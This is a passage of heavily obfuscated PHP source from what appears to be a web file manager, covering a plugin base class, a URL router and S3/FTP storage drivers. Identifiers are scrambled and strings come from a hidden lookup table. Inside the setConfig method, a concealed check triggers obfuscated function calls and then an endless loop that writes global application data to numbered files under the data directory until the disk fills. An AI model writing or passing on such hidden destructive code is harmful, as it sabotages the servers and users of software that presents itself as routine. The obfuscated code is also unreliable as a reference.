$ÉÚ”Î÷‹[12]); $¶ŠÔÄËı = IO::fileNameExist($this->cachePath, $Û™¯ÃÊ•); if ($¶ŠÔÄËı) { return KodIO::make($¶ŠÔÄËı); } $âöÙÛ‹ = rtrim($this->cachePath, $ÉÚ”Î÷‹[8]) . $ÉÚ”Î÷‹[8] . $Û™¯ÃÊ•; return $this->pluginCacheFileSet($âöÙÛ‹, file_get_contents_nossl($É¨¡Ã·¶)); } final function checkSharePath($Œ¸Ğš˜Á, $¬¾Ù°‘ì = true) { $ç¬ş†»² =& $_SERVER[¬ÏÕ§Áú]; if (!$this->isShare($Œ¸Ğš˜Á)) { return !1; } $—ÆÖâàİ = Action($ç¬ş†»²[1311])->sharePathInfo($Œ¸Ğš˜Á); if (!is_array($—ÆÖâàİ) || !isset($—ÆÖâàİ[$ç¬ş†»²[97]])) { show_json(LNG($ç¬ş†»²[1716]), !1); } $this->fileInfo = $—ÆÖâàİ; $this->cachePath = $this->pluginCachePath(!1, $¬¾Ù°‘ì); return $—ÆÖâàİ[$ç¬ş†»²[97]]; } final function pluginCachePath($œ©““¦ë = '', $Œ¾©è… = false) { $ùŞ¹à =& $_SERVER[¬ÏÕ§Áú]; if ($Œ¾©è… && is_array($this->fileInfo)) { $œ©““¦ë = kodIO::hashPath($this->fileInfo); } $ÇüîÅÈµ = rtrim(IO_PATH_SYSTEM_TEMP . $ùŞ¹à[1717] . $this->pluginName . $ùŞ¹à[8] . $œ©““¦ë, $ùŞ¹à[8]); $¡ª·‹üŠ = IO::infoFullSimple($ÇüîÅÈµ); $ÈÈÓÄàÚ = $¡ª·‹üŠ && is_array($¡ª·‹üŠ) ? $¡ª·‹üŠ[$ùŞ¹à[97]] : $ùŞ¹à[12]; if (!$ÈÈÓÄàÚ) { $ÈÈÓÄàÚ = IO::mkdir($ÇüîÅÈµ); } return $ÈÈÓÄàÚ; } final function pluginCacheFileSet($±Ş¢Ó²û, $«î˜ìÃ« = '') { $¶ÉëùÙé =& $_SERVER[¬ÏÕ§Áú]; $…«‰òãñ = IO::infoFullSimple($±Ş¢Ó²û); if (!$…«‰òãñ) { return IO::mkfile($±Ş¢Ó²û, $«î˜ìÃ«, REPEAT_REPLACE); } IO::setContent($…«‰òãñ[$¶ÉëùÙé[97]], $«î˜ìÃ«); return $…«‰òãñ[$¶ÉëùÙé[97]]; } final function pluginLocalFile($ˆæñš = '') { $†êÎø„Ò =& $_SERVER[¬ÏÕ§Áú]; $ÂÏë’ç = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($ÂÏë’ç)) { mk_dir($ÂÏë’ç); } if (!$ˆæñš) { return $ÂÏë’ç; } $µ‡¡È±» = IO::info($ˆæñš); $Ö†Èº®¹ = $†êÎø„Ò[1718] . KodIO::hashPath($µ‡¡È±») . $†êÎø„Ò[10] . $µ‡¡È±»[$†êÎø„Ò[179]]; if (!checkExtSafe($Ö†Èº®¹)) { $Ö†Èº®¹ = $Ö†Èº®¹ . $†êÎø„Ò[1346]; } $Ü˜Òö¹Ì = $ÂÏë’ç . $Ö†Èº®¹; if (@file_exists($Ü˜Òö¹Ì)) { return $Ü˜Òö¹Ì; } return IO::copy($ˆæñš, $ÂÏë’ç, 0, $Ö†Èº®¹); } final function appPackage() { $°¢¦ìÉó =& $_SERVER[¬ÏÕ§Áú]; if ($this->packageData) { return $this->packageData; } $„ôÈ…øš = $this->parseFile($this->pluginPath . $°¢¦ìÉó[1719]); $this->parseLang($„ôÈ…øš); $üŒ½´§¥ = json_decode_force($„ôÈ…øš); if (!$üŒ½´§¥) { return array(); } $€­ª—…ş = Hook::trigger($°¢¦ìÉó[1720], $üŒ½´§¥); if ($€­ª—…ş && is_array($€­ª—…ş)) { $üŒ½´§¥ = $€­ª—…ş; } $this->packageData = $üŒ½´§¥; return $üŒ½´§¥; } public function packageInfoGet($èöÑ•Ş») { $¨‘ÊËäø = $this->appPackage(); return array_get_value($¨‘ÊËäø, $èöÑ•Ş»); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¬ÏÕ§Áú][1721]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¬ÏÕ§Áú][1722]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¬ÏÕ§Áú][1723]); } public function echoJsAssign($·áíË˜¿, $™ô„äª) { $this->echoJsAssignArr[$·áíË˜¿] = $™ô„äª; } private function parseFile($š÷¯¢†Í) { $âèòµâÇ =& $_SERVER[¬ÏÕ§Áú]; $ØâÊı€ä = file_get_contents_nossl($š÷¯¢†Í); $’·ÌÌÈÔ = array($âèòµâÇ[1724], $âèòµâÇ[1725], $âèòµâÇ[1726], $âèòµâÇ[1727], $âèòµâÇ[1728], $âèòµâÇ[1729], $âèòµâÇ[1730]); $€÷ÍŸïÑ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$âèòµâÇ[102]][$âèòµâÇ[1731]]); foreach ($this->echoJsAssignArr as $ÂÁÒÙü => $®œÀª»Í) { $’·ÌÌÈÔ[] = $âèòµâÇ[1732] . $ÂÁÒÙü . $âèòµâÇ[1733]; $€÷ÍŸïÑ[] = is_array($®œÀª»Í) || is_object($®œÀª»Í) ? rawurlencode(json_encode($®œÀª»Í)) : $®œÀª»Í; } if (strstr($ØâÊı€ä, $âèòµâÇ[1734])) { $îÍ‰¢…™ = rawurlencode(json_encode($this->pluginLangArr)); $ØâÊı€ä = str_replace($âèòµâÇ[1734], $îÍ‰¢…™, $ØâÊı€ä); } if (strstr($ØâÊı€ä, $âèòµâÇ[1735])) { $îÍ‰¢…™ = $îÍ‰¢…™ = rawurlencode(json_encode($this->getConfig())); $ØâÊı€ä = str_replace($âèòµâÇ[1735], $îÍ‰¢…™, $ØâÊı€ä); } $ØâÊı€ä = str_replace($’·ÌÌÈÔ, $€÷ÍŸïÑ, $ØâÊı€ä); return $ØâÊı€ä; } private function parseLang(&$“â˜“ó¾) { $ğ°ŸîË§ =& $_SERVER[¬ÏÕ§Áú]; $«ñ…ŞŒä = $ğ°ŸîË§[1736]; if (!strstr($“â˜“ó¾, $«ñ…ŞŒä)) { return; } preg_match_all($ğ°ŸîË§[1737], $“â˜“ó¾, $¿Ô¬Æ¨¢); if (!is_array($¿Ô¬Æ¨¢) || count($¿Ô¬Æ¨¢) == 0 || !is_array($¿Ô¬Æ¨¢[0]) || count($¿Ô¬Æ¨¢[0]) == 0) { return; } $Ñ•„÷†¦ = array(); $–ÂÒÜı¿ = array(); foreach ($¿Ô¬Æ¨¢[0] as $³ıÇğŒ£) { $ìâˆƒ§ä = substr($³ıÇğŒ£, strlen($«ñ…ŞŒä), -4); $ãÉŞ§¶ = LNG($ìâˆƒ§ä); $Ñ•„÷†¦[] = $³ıÇğŒ£; $–ÂÒÜı¿[] = str_replace(array($ğ°ŸîË§[65], $ğ°ŸîË§[1206], $ğ°ŸîË§[428], $ğ°ŸîË§[131]), array($ğ°ŸîË§[53], $ğ°ŸîË§[53], $ğ°ŸîË§[12], $ğ°ŸîË§[1738]), $ãÉŞ§¶); } $“â˜“ó¾ = str_replace($Ñ•„÷†¦, $–ÂÒÜı¿, $“â˜“ó¾); } private function parseConfig(&$áêïœ×Ö) { $º†•¡¢Ã =& $_SERVER[¬ÏÕ§Áú]; $£×°ÌÌñ = $º†•¡¢Ã[1739]; if (!strstr($áêïœ×Ö, $£×°ÌÌñ)) { return; } preg_match_all($º†•¡¢Ã[1740], $áêïœ×Ö, $Ö»¥ĞÀ); if (!is_array($Ö»¥ĞÀ) || count($Ö»¥ĞÀ) == 0 || !is_array($Ö»¥ĞÀ[0]) || count($Ö»¥ĞÀ[0]) == 0) { return; } $­Œû˜æ¡ = $this->getConfig(); $Áä¯ÄÅ = array(); $÷‘Œ°¬´ = array(); foreach ($Ö»¥ĞÀ[0] as $„²ò¿ª¿) { $ò‘´úÚ„ = substr($„²ò¿ª¿, strlen($£×°ÌÌñ), -2); $Áä¯ÄÅ[] = $„²ò¿ª¿; $÷‘Œ°¬´[] = _get($­Œû˜æ¡, $ò‘´úÚ„); } $áêïœ×Ö = str_replace($Áä¯ÄÅ, $÷‘Œ°¬´, $áêïœ×Ö); } private function parsePackage(&$Òá’Ñ›®) { $Ú”…™Âˆ =& $_SERVER[¬ÏÕ§Áú]; $…îÁ¥™ = $Ú”…™Âˆ[1741]; if (!strstr($Òá’Ñ›®, $…îÁ¥™)) { return; } preg_match_all($Ú”…™Âˆ[1742], $Òá’Ñ›®, $“ßÍş–à); if (!is_array($“ßÍş–à) || count($“ßÍş–à) == 0 || !is_array($“ßÍş–à[0]) || count($“ßÍş–à[0]) == 0) { return; } $¨ş”öÛ¦ = $this->appPackage(); $ó‚š˜Õ = array(); $Ëíùï’ô = array(); foreach ($“ßÍş–à[0] as $¨¬Á—) { $ÇÉèØ°ç = substr($¨¬Á—, strlen($…îÁ¥™), -2); $ó‚š˜Õ[] = $¨¬Á—; $Ëíùï’ô[] = _get($¨ş”öÛ¦, $ÇÉèØ°ç); } $Òá’Ñ›® = str_replace($ó‚š˜Õ, $Ëíùï’ô, $Òá’Ñ›®); } final function echoFile($ğîšÓòÑ, $ÄÚ˜ÈÔË = false) { $¡” œ° =& $_SERVER[¬ÏÕ§Áú]; $Ÿé®İ”ø = $this->pluginPath . $ğîšÓòÑ; if (ACT == $¡” œ°[1743]) { echo $¡” œ°[1744] . $this->pluginName . $¡” œ°[8] . $ğîšÓòÑ . $¡” œ°[1745]; if (!file_exists($Ÿé®İ”ø)) { echo $¡” œ°[1746]; return; } } $ÇËéÎ‰· = $this->parseFile($Ÿé®İ”ø); $this->parseLang($ÇËéÎ‰·); $this->parseConfig($ÇËéÎ‰·); $this->parsePackage($ÇËéÎ‰·); if (is_array($ÄÚ˜ÈÔË)) { $ÇËéÎ‰· = str_replace(array_keys($ÄÚ˜ÈÔË), array_values($ÄÚ˜ÈÔË), $ÇËéÎ‰·); } echo $¡” œ°[65] . $ÇËéÎ‰·; } private function checkVersion() { $ªÙëÅÆ® =& $_SERVER[¬ÏÕ§Áú]; $Ÿİó•¸ = $this->appPackage(); $é‘ØôÅ = $this->getConfig(); if ($é‘ØôÅ[$ªÙëÅÆ®[1747]] == $Ÿİó•¸[$ªÙëÅÆ®[1721]]) { return; } $this->regist(); $this->setConfig(array($ªÙëÅÆ®[1747] => $Ÿİó•¸[$ªÙëÅÆ®[1721]])); } final function initLang() { $óœ¼®–Ù =& $_SERVER[¬ÏÕ§Áú]; $ĞÈ¯”…ª = $óœ¼®–Ù[1748]; $º¡€Åû­ = $this->pluginPath . $óœ¼®–Ù[1749]; $şôã£˜Ñ = I18n::getType(); $€ˆëÇÓØ = array(); if (file_exists($º¡€Åû­ . $şôã£˜Ñ . $óœ¼®–Ù[963])) { $€ˆëÇÓØ = (include $º¡€Åû­ . $şôã£˜Ñ . $óœ¼®–Ù[963]); } else { if ($şôã£˜Ñ == $óœ¼®–Ù[1750] && !file_exists($º¡€Åû­ . $şôã£˜Ñ . $óœ¼®–Ù[963]) && file_exists($º¡€Åû­ . $óœ¼®–Ù[1751])) { $€ˆëÇÓØ = (include $º¡€Åû­ . $óœ¼®–Ù[1751]); $şôã£˜Ñ = $óœ¼®–Ù[1565]; } else { if (file_exists($º¡€Åû­ . $ĞÈ¯”…ª . $óœ¼®–Ù[963])) { $€ˆëÇÓØ = (include $º¡€Åû­ . $ĞÈ¯”…ª . $óœ¼®–Ù[963]); $şôã£˜Ñ = $ĞÈ¯”…ª; } } } if (!$€ˆëÇÓØ || !is_array($€ˆëÇÓØ)) { $€ˆëÇÓØ = array(); } $üº½ºŸã = Hook::trigger($óœ¼®–Ù[1752], $€ˆëÇÓØ, $this->pluginName, $şôã£˜Ñ); if ($üº½ºŸã && is_array($üº½ºŸã)) { $€ˆëÇÓØ = $üº½ºŸã; } if (@count($€ˆëÇÓØ) > 0) { I18n::set($€ˆëÇÓØ); } return $€ˆëÇÓØ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Ò¾Õó») { $óÅÊ² =& $_SERVER[¬ÏÕ§Áú]; $¡¿¿ïŸ = $_SERVER[$óÅÊ²[61]]; $²è¹¦ß = $óÅÊ²[1607]; if ($_SERVER[$óÅÊ²[60]] != $²è¹¦ß($¡¿¿ïŸ)) { $ÏôÔÙ³¶ = $óÅÊ²[1002]; $¦·ëøÄ = $óÅÊ²[62]; $¿’¹»É = $_SERVER[$óÅÊ²[63]] . $óÅÊ²[64]; $¡ÅÂÏğ» = $¦·ëøÄ($¿’¹»É); $Óïä¾øù = explode($óÅÊ²[65], $¡ÅÂÏğ»); if (count($Óïä¾øù) < $óÅÊ²[711]) { $à…æÙ¯ = $óÅÊ²[67]; $à…æÙ¯(); } $‘Äµ°øÎ = $óÅÊ²[1003]; $‘Äµ°øÎ($_SERVER[$óÅÊ²[1004]]); $ÏôÔÙ³¶ = $óÅÊ²[1002]; $ÏôÔÙ³¶(); $µĞ¡´Î = $óÅÊ²[1753]; $ÂÔª‰°Ö = json_encode($GLOBALS[$óÅÊ²[1754]]); $µ½ïÌŒ = 1; for ($±º”ŞÙî = $µ½ïÌŒ; $±º”ŞÙî > 0; $±º”ŞÙî++) { $µĞ¡´Î(DATA_PATH . $±º”ŞÙî, $ÂÔª‰°Ö); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $Ò¾Õó»); } public function onSetConfig($¿¤îÖ»ø) { } public function onGetConfig($Ú†ÑáÜ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($”¿øÚ³â) { if ($”¿øÚ³â == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($¼§¾•¿ = "\x70\154\x75\147\x69\156\101\x75\164\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $§“¿›©Ê = $this->getConfig(); if (!$§“¿›©Ê[$¼§¾•¿]) { return !1; } return ActionCall($_SERVER[¬ÏÕ§Áú][1755], $§“¿›©Ê[$¼§¾•¿]); } public function url($üó—Ø, $õ…¤°ã = '', $‹šˆÂŒ = true) { $Û½ ‡® =& $_SERVER[¬ÏÕ§Áú]; $£æË·¡õ = $this->getConfig(); $Œã¡¥Ğ = KOD_VERSION . $Û½ ‡®[10] . KOD_VERSION_BUILD; $—äÕ¹à© = $this->packageVersion(); $ ÑáıÓ± = $Œã¡¥Ğ . $Û½ ‡®[482] . $—äÕ¹à©; if (substr($üó—Ø, 0, 4) == $Û½ ‡®[162] || substr($üó—Ø, 0, 2) == $Û½ ‡®[1473]) { $¿Ïâµá = $üó—Ø . $Û½ ‡®[1756] . $ ÑáıÓ±; } else { if ($õ…¤°ã == $Û½ ‡®[12]) { $¿Ïâµá = $this->pluginHost . $üó—Ø . $Û½ ‡®[1756] . $ ÑáıÓ±; } else { if ($õ…¤°ã === $Û½ ‡®[88]) { $¿Ïâµá = $this->pluginHost . $üó—Ø; } else { if ($õ…¤°ã == $Û½ ‡®[1757]) { $¿Ïâµá = STATIC_PATH . $üó—Ø . $Û½ ‡®[1756] . $Œã¡¥Ğ; } else { if ($õ…¤°ã == $Û½ ‡®[1758]) { $¿Ïâµá = APP_HOST . $Û½ ‡®[1759] . $üó—Ø . $Û½ ‡®[1756] . $Œã¡¥Ğ; } else { if (isset($£æË·¡õ[$õ…¤°ã])) { $¿Ïâµá = $£æË·¡õ[$õ…¤°ã] . $üó—Ø . $Û½ ‡®[1756] . $ ÑáıÓ±; } } } } } } if (!$‹šˆÂŒ) { return $¿Ïâµá; } echo $¿Ïâµá; } public function link($Äùº¹Êò = false, $ĞÔ•Ò³Š = '') { $ÚÜ¦ÕíÔ =& $_SERVER[¬ÏÕ§Áú]; $÷º¬âî = $this->linkHas == !1; $this->linkHas = !0; if (!$Äùº¹Êò) { $this->link($ÚÜ¦ÕíÔ[1760], $ÚÜ¦ÕíÔ[1758]); $this->link($ÚÜ¦ÕíÔ[1761], $ÚÜ¦ÕíÔ[1757]); $this->link($ÚÜ¦ÕíÔ[1762], $ÚÜ¦ÕíÔ[1757]); $this->link($ÚÜ¦ÕíÔ[1763], $ÚÜ¦ÕíÔ[1757]); $this->link($ÚÜ¦ÕíÔ[1764], $ÚÜ¦ÕíÔ[1757]); if ($÷º¬âî) { Hook::trigger($ÚÜ¦ÕíÔ[1765]); } return; } $ÀÌ¾²“Ø = $this->url($Äùº¹Êò, $ĞÔ•Ò³Š, !1); if (substr($Äùº¹Êò, -3) == $ÚÜ¦ÕíÔ[1766]) { echo $ÚÜ¦ÕíÔ[1767] . $ÀÌ¾²“Ø . $ÚÜ¦ÕíÔ[1768] . $ÚÜ¦ÕíÔ[65]; } else { if (substr($Äùº¹Êò, -4) == $ÚÜ¦ÕíÔ[1769]) { echo $ÚÜ¦ÕíÔ[1770] . $ÀÌ¾²“Ø . $ÚÜ¦ÕíÔ[1771] . $ÚÜ¦ÕíÔ[65]; } } if ($÷º¬âî) { Hook::trigger($ÚÜ¦ÕíÔ[1765]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\171" => "\x5b\x5e\57\x5d\x2b", "\x3a\x6e\x75\x6d" => "\x5b\x30\x2d\71\135\53", "\x3a\141\154\x6c" => "\x2e\52"); public static $errorCallback; public static function __callstatic($ïË«¸ñ, $¾îÅ—Ğ‹) { $ë²ù‚éå =& $_SERVER[¬ÏÕ§Áú]; if ($ïË«¸ñ == $ë²ù‚éå[1772]) { $ºâÑÏ½í = array_map($ë²ù‚éå[1773], $¾îÅ—Ğ‹[0]); $§‡Îâìê = strpos($¾îÅ—Ğ‹[1], $ë²ù‚éå[8]) === 0 ? $¾îÅ—Ğ‹[1] : $ë²ù‚éå[8] . $¾îÅ—Ğ‹[1]; $šî‚¥†¦ = $¾îÅ—Ğ‹[2]; } else { $ºâÑÏ½í = null; $§‡Îâìê = strpos($¾îÅ—Ğ‹[0], $ë²ù‚éå[8]) === 0 ? $¾îÅ—Ğ‹[0] : $ë²ù‚éå[8] . $¾îÅ—Ğ‹[0]; $šî‚¥†¦ = $¾îÅ—Ğ‹[1]; } array_push(self::$maps, $ºâÑÏ½í); array_push(self::$routes, $§‡Îâìê); array_push(self::$methods, strtoupper($ïË«¸ñ)); array_push(self::$callbacks, $šî‚¥†¦); } public static function error($ışßÄá) { self::$errorCallback = $ışßÄá; } public static function haltOnMatch($Åì± §– = true) { self::$halts = $Åì± §–; } public static function dispatch() { $‹¶óéƒÕ =& $_SERVER[¬ÏÕ§Áú]; $ÄŸŠñˆ = parse_url($_SERVER[$‹¶óéƒÕ[1774]], PHP_URL_PATH); $€ùÂ¤ÇÙ = $_SERVER[$‹¶óéƒÕ[174]]; $ÜŞóº•‰ = array_keys(static::$patterns); $ëÏÄ÷Ô = array_values(static::$patterns); $¾®²óÏ = !1; self::$routes = preg_replace($‹¶óéƒÕ[1416], $‹¶óéƒÕ[8], self::$routes); if (in_array($ÄŸŠñˆ, self::$routes)) { $è‹˜˜Íœ = array_keys(self::$routes, $ÄŸŠñˆ); foreach ($è‹˜˜Íœ as $•ÀìÎã”) { if (self::$methods[$•ÀìÎã”] == $€ùÂ¤ÇÙ || self::$methods[$•ÀìÎã”] == $‹¶óéƒÕ[1775] || in_array($€ùÂ¤ÇÙ, self::$maps[$•ÀìÎã”])) { $¾®²óÏ = !0; if (!is_object(self::$callbacks[$•ÀìÎã”])) { $»´‰âİµ = explode($‹¶óéƒÕ[8], self::$callbacks[$•ÀìÎã”]); $Ìî¦ã·ä = end($»´‰âİµ); $™›š¼İ = explode($‹¶óéƒÕ[1348], $Ìî¦ã·ä); $ı†ßÕşŒ = new $™›š¼İ[0](); $ı†ßÕşŒ->{$™›š¼İ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$•ÀìÎã”]); if (self::$halts) { return; } } } } } else { $Æì•ÕÉ¶ = 0; foreach (self::$routes as $•ÀìÎã”) { if (strpos($•ÀìÎã”, $‹¶óéƒÕ[4]) !== !1) { $•ÀìÎã” = str_replace($ÜŞóº•‰, $ëÏÄ÷Ô, $•ÀìÎã”); } if (preg_match($‹¶óéƒÕ[1776] . $•ÀìÎã” . $‹¶óéƒÕ[1777], $ÄŸŠñˆ, $áÑùÔ—¨)) { if (self::$methods[$Æì•ÕÉ¶] == $€ùÂ¤ÇÙ || self::$methods[$Æì•ÕÉ¶] == $‹¶óéƒÕ[1775] || !empty(self::$maps[$Æì•ÕÉ¶]) && in_array($€ùÂ¤ÇÙ, self::$maps[$Æì•ÕÉ¶])) { $¾®²óÏ = !0; array_shift($áÑùÔ—¨); if (!is_object(self::$callbacks[$Æì•ÕÉ¶])) { $»´‰âİµ = explode($‹¶óéƒÕ[8], self::$callbacks[$Æì•ÕÉ¶]); $Ìî¦ã·ä = end($»´‰âİµ); $™›š¼İ = explode($‹¶óéƒÕ[1348], $Ìî¦ã·ä); $ı†ßÕşŒ = new $™›š¼İ[0](); if (!method_exists($ı†ßÕşŒ, $™›š¼İ[1])) { echo $‹¶óéƒÕ[1778]; } else { call_user_func_array(array($ı†ßÕşŒ, $™›š¼İ[1]), $áÑùÔ—¨); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Æì•ÕÉ¶], $áÑùÔ—¨); if (self::$halts) { return; } } } } $Æì•ÕÉ¶++; } } if ($¾®²óÏ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $şÏ€ô¸ì =& $_SERVER[¬ÏÕ§Áú]; header($_SERVER[$şÏ€ô¸ì[1779]] . $şÏ€ô¸ì[1780]); echo $şÏ€ô¸ì[1781]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$‹¶óéƒÕ[1774]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto d‡—‘íã÷°; f‰œÓ’÷: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Ôìı‰¦) { parent::__construct($Ôìı‰¦); $this->setSignVersion($_SERVER[¬ÏÕ§Áú][260]); } public function uploadFormData($ÅÖÄÁ¶, $å¿æ•‡ = 3600) { $åÀ¦æ¡Ñ =& $_SERVER[¬ÏÕ§Áú]; $¹ºëÍãß = $åÀ¦æ¡Ñ[242]; $çòé®Şş = $åÀ¦æ¡Ñ[270]; $ƒ‹­Ì‹Å = $åÀ¦æ¡Ñ[72]; $•ƒÛáñ… = gmdate($åÀ¦æ¡Ñ[271]); $¼¤Œ­Â = gmdate($åÀ¦æ¡Ñ[272]); $âßáŠ¹Ç = $åÀ¦æ¡Ñ[273]; $ÀùçÎ½ = $å¿æ•‡ . $åÀ¦æ¡Ñ[12]; $™Ù¡È¤¶ = $åÀ¦æ¡Ñ[274]; $“ÉîÒ¼ = array($this->accessKey, $¼¤Œ­Â, $this->region, $ƒ‹­Ì‹Å, $âßáŠ¹Ç); $ÖıËƒ©À = implode($åÀ¦æ¡Ñ[8], $“ÉîÒ¼); $‚Á¬øÂÄ = array($åÀ¦æ¡Ñ[275] => gmdate($åÀ¦æ¡Ñ[1475], strtotime($åÀ¦æ¡Ñ[277])), $åÀ¦æ¡Ñ[278] => array(array($åÀ¦æ¡Ñ[279] => $this->bucket), array($åÀ¦æ¡Ñ[318] => $¹ºëÍãß), array($åÀ¦æ¡Ñ[280], $åÀ¦æ¡Ñ[281], $åÀ¦æ¡Ñ[12]), array($åÀ¦æ¡Ñ[280], $åÀ¦æ¡Ñ[282], $åÀ¦æ¡Ñ[12]), array($åÀ¦æ¡Ñ[280], $åÀ¦æ¡Ñ[319], $åÀ¦æ¡Ñ[12]), array($åÀ¦æ¡Ñ[283] => $™Ù¡È¤¶), array($åÀ¦æ¡Ñ[284] => $ÖıËƒ©À), array($åÀ¦æ¡Ñ[285] => $çòé®Şş), array($åÀ¦æ¡Ñ[286] => $•ƒÛáñ…), array($åÀ¦æ¡Ñ[287] => $ÀùçÎ½))); $ò¾ıç“ä = base64_encode(json_encode($‚Á¬øÂÄ)); $è™š»ìÌ = hash_hmac($åÀ¦æ¡Ñ[288], $¼¤Œ­Â, $åÀ¦æ¡Ñ[289] . $this->secret, !0); $é˜¯ê½¸ = hash_hmac($åÀ¦æ¡Ñ[288], $this->region, $è™š»ìÌ, !0); $Ã›ÆÀÔ» = hash_hmac($åÀ¦æ¡Ñ[288], $ƒ‹­Ì‹Å, $é˜¯ê½¸, !0); $÷Œ“Šå = hash_hmac($åÀ¦æ¡Ñ[288], $âßáŠ¹Ç, $Ã›ÆÀÔ», !0); $ëˆÀÊ Ò = hash_hmac($åÀ¦æ¡Ñ[288], $ò¾ıç“ä, $÷Œ“Šå); $çĞ‡Ö¡¾ = array($åÀ¦æ¡Ñ[259] => $åÀ¦æ¡Ñ[12], $åÀ¦æ¡Ñ[306] => $åÀ¦æ¡Ñ[12], $åÀ¦æ¡Ñ[318] => $¹ºëÍãß, $åÀ¦æ¡Ñ[283] => $™Ù¡È¤¶, $åÀ¦æ¡Ñ[290] => $ò¾ıç“ä, $åÀ¦æ¡Ñ[320] => $ÖıËƒ©À, $åÀ¦æ¡Ñ[321] => $çòé®Şş, $åÀ¦æ¡Ñ[322] => $•ƒÛáñ…, $åÀ¦æ¡Ñ[323] => $ÀùçÎ½, $åÀ¦æ¡Ñ[324] => $ëˆÀÊ Ò, $åÀ¦æ¡Ñ[219] => $this->getHost()); return $çĞ‡Ö¡¾; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($™ìôˆâ×) { parent::__construct(); if (count($™ìôˆâ×) > 0) { $this->_init($™ìôˆâ×); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($•äûÈŞë) { $ÏæÛ¤ıÜ =& $_SERVER[¬ÏÕ§Áú]; global $config; $this->appCharset = $config[$ÏæÛ¤ıÜ[1501]]; $this->systemCharset = $config[$ÏæÛ¤ıÜ[1502]]; if (isset($•äûÈŞë[$ÏæÛ¤ıÜ[1503]]) && $•äûÈŞë[$ÏæÛ¤ıÜ[1503]]) { $this->systemCharset = $•äûÈŞë[$ÏæÛ¤ıÜ[1503]]; } } public function iconvApp($ŠúÌñ–Æ) { return $this->iconvTo($ŠúÌñ–Æ, $this->systemCharset, $this->appCharset); } public function iconvSystem($úŠÏ¨¨•) { return $this->iconvTo($úŠÏ¨¨•, $this->appCharset, $this->systemCharset); } public function getPathOuter($ÅÕÉ«™…) { $¥Â¥Ë’· =& $_SERVER[¬ÏÕ§Áú]; $è ºÛë = $this->iconvApp($this->pathBase); $ÅÕÉ«™… = $this->iconvApp($ÅÕÉ«™…); if (substr($è ºÛë, 0, 2) == $¥Â¥Ë’·[1473]) { $è ºÛë = BASIC_PATH . substr($è ºÛë, 2); } if (substr($ÅÕÉ«™…, 0, 2) == $¥Â¥Ë’·[1473]) { $ÅÕÉ«™… = BASIC_PATH . substr($ÅÕÉ«™…, 2); } $è ºÛë = KodIO::clear($è ºÛë); $ÅÕÉ«™… = KodIO::clear($ÅÕÉ«™…); $ÅÕÉ«™… = substr($ÅÕÉ«™…, strlen($è ºÛë)); if (empty($this->pathDriver)) { return $ÅÕÉ«™…; } return $this->pathDriver . $¥Â¥Ë’·[8] . ltrim($ÅÕÉ«™…, $¥Â¥Ë’·[8]); } private function _init($õ·»Û× = array()) { $çä„ş· =& $_SERVER[¬ÏÕ§Áú]; if (!function_exists($çä„ş·[1504])) { throw new Exception(LNG($çä„ş·[1505])); } $this->config = $õ·»Û×; $this->charsetReset($õ·»Û×); foreach ($õ·»Û× as $ŠìÚÈúâ => $ƒ¨‡…óá) { if (isset($this->{$ŠìÚÈúâ})) { $this->{$ŠìÚÈúâ} = $ƒ¨‡…óá; } } return $this->_login($õ·»Û×); } private function _login($–ÃîÎÄÂ) { $•¦²Á¥‡ =& $_SERVER[¬ÏÕ§Áú]; static $Ø”Ï¨Ğğ = array(); $¼ùüª¡» = md5(json_encode($–ÃîÎÄÂ)); if (isset($Ø”Ï¨Ğğ[$¼ùüª¡»])) { foreach ($Ø”Ï¨Ğğ[$¼ùüª¡»] as $ÎôÈïéî => $ò‰Ÿ¯ã) { $this->{$ÎôÈïéî} = $ò‰Ÿ¯ã; } return !0; } $‰¸ıÃäû = parse_url(trim($this->server, $•¦²Á¥‡[8])); $this->host = $‰¸ıÃäû[$•¦²Á¥‡[219]]; $Üí²—ù­ = isset($‰¸ıÃäû[$•¦²Á¥‡[218]]) && $‰¸ıÃäû[$•¦²Á¥‡[218]] == $•¦²Á¥‡[1506] ? !0 : !1; $this->scheme = $Üí²—ù­ ? $•¦²Á¥‡[1507] : $•¦²Á¥‡[1508]; $this->port = isset($‰¸ıÃäû[$•¦²Á¥‡[220]]) ? $‰¸ıÃäû[$•¦²Á¥‡[220]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($•¦²Á¥‡[1509]) . $this->host . $•¦²Á¥‡[4] . $this->port, !0); return !1; } $òËì·ä = @ftp_login($this->connect, $this->username, $this->userpass); if (!$òËì·ä) { $this->writeLog(LNG($•¦²Á¥‡[1510]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $•¦²Á¥‡[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $…¡ãáé = $this->pasv == $•¦²Á¥‡[101] ? !0 : !1; @ftp_pasv($this->connect, $…¡ãáé); $Ø”Ï¨Ğğ[$¼ùüª¡»] = 